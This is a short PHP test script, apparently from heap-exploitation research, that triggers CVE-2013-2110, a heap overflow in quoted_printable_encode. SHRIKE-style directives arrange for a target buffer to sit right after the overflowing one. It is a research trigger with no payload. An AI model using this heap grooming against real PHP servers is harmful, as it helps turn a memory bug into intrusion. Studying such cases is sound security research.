<?php
# CVE-2013-2110 - https://bugs.php.net/bug.php?id=64879
# 
# Heap-based buffer overflow in the php_quot_print_encode function
# The source buffer is the first buffer allocated by quoted_printable_encode and
# is 384 bytes in size. The overflow is triggered by the same function and
# results in a NULL byte being written immediately after the source buffer.

putenv("VTR_LOG=1");
$quote_str = str_repeat("\xf4", 123);

#X-SHRIKE HEAP-MANIP 384 32
# Allocates a 32 byte buffer as its third allocation
#X-SHRIKE RECORD-ALLOC 2 1
$vtx_dst = hash_init("md5");
#X-SHRIKE HEAP-MANIP 384 32
#X-SHRIKE RECORD-ALLOC 0 2
quoted_printable_encode($quote_str);
#X-SHRIKE REQUIRE-DISTANCE 1 2 384

putenv("VTR_LOG");
?>
